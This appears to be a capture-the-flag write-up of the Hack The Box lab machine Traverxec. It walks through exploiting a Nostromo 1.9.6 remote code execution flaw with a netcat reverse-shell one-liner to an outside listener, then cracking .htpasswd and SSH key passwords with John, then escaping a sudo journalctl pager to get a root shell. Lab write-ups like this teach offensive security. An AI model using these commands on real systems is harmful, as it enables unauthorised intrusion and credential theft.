---
layout: post
category: writeup
---

## Machine Info

- Name: Traverxec
- Description: Traverxec is an easy Linux machine that features a Nostromo Web Server, which is vulnerable to Remote Code Execution (RCE). The Web server configuration files lead us to SSH credentials, which allow us to move laterally to the user `david`. A bash script in the user&amp;amp;#039;s home directory reveals that the user can execute `journalctl` as root. This is exploited to spawn a `root` shell.
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT   STATE SERVICE VERSION   
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)   
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From what I know, nostromo 1.9.6 is vulnerable to RCE:

```bash
HTB searchsploit nostromo
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)                                                         | multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                                                                                       | multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                                                         | linux/remote/35466.sh

```

sure enough, there is an RCE available, let's download it and run it!

```bash
HTB python2 47837.py 10.10.10.165 80 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.14 443 >/tmp/f"
```

shell on my listener:

```bash
HTB nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.165] 46732
sh: 0: can't access tty; job control turned off
$ 
```
## Privilege Escalation

Doing my usual enumeration, I attempt to read files in the web root of the website to look for config files and such.

```bash
www-data@traverxec:/var/nostromo/conf$ ls -la
total 20
drwxr-xr-x 2 root daemon 4096 Oct 27  2019 .
drwxr-xr-x 6 root root   4096 Oct 25  2019 ..
-rw-r--r-- 1 root bin      41 Oct 25  2019 .htpasswd
-rw-r--r-- 1 root bin    2928 Oct 25  2019 mimes
-rw-r--r-- 1 root bin     498 Oct 25  2019 nhttpd.conf
www-data@traverxec:/var/nostromo/conf$ cat .htpasswd 
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

I was able to find some creds belonging to david, let's crack them:

```bash
HTB john -w=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (?)     
1g 0:00:00:23 DONE (2024-01-26 08:19) 0.04182g/s 442427p/s 442427c/s 442427C/s Noyoudo..Nous4=5
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Looking at the configuration file I can see that in davids home directory there is a file called `public_www`. This directory can be accessed by www-data due to the SETUID RECOMMENDED block.

```bash
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
www-data@traverxec:/var/nostromo/conf$ ls -la /home/david/public_www
total 16
drwxr-xr-x 3 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
```

Checking in that directory shows me a backup ssh identity file, let me cp that out and read it

```bash
www-data@traverxec:/var/nostromo/conf$ cp /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz /tmp
```

Key was encrypted so i exported it and cracked it

```bash
HTB john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (key)     
1g 0:00:00:00 DONE (2024-01-26 08:33) 100.0g/s 19200p/s 19200c/s 19200C/s carolina..november
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

I can ssh in now as david, checking the bin directory in his home folder I find this script:

```bash
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

It looks like I should be able to run journalctl as root so let me run just that command!
```bash
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Fri 2024-01-26 08:07:35 EST, end at Fri 2024-01-26 08:36:31 EST. --
Jan 26 08:25:40 traverxec sudo[6583]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/0 ruser=www-data rhost=  user=w
Jan 26 08:25:41 traverxec sudo[6583]: pam_unix(sudo:auth): conversation failed
Jan 26 08:25:41 traverxec sudo[6583]: pam_unix(sudo:auth): auth could not identify password for [www-data]
Jan 26 08:25:41 traverxec sudo[6583]: www-data : command not allowed ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=list
Jan 26 08:25:42 traverxec nologin[6628]: Attempted login by UNKNOWN on UNKNOWN
!sh
# whoami
root
#
```

When it pops up, it's in a `less` or something similar so I can type `!sh` and get a root shell.

best,
gerbsec